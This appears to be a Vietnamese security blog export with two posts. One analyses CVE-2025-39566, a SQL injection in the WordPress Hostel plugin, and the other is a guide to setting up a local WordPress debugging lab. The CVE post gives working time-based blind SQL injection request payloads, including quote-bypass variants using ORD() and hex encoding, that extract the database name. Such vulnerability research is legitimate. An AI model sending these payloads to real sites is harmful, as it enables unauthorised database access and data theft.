$wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server 